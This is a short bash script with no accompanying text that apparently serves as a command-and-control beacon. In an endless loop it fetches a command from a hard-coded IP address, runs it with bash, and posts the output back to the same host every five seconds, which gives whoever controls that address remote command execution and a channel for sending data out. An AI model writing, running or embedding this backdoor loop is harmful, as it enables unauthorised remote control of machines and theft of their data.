#!/bin/bash
C1="54.95.251.88"
while true; do
    CMD=$(curl -fsSL "http://$C1/getcmd")
    OUTPUT=$(bash -c "$CMD" 2>&1)
    curl -fsSL -X POST --data "$OUTPUT" "http://$C1/postresult"
    sleep 5
done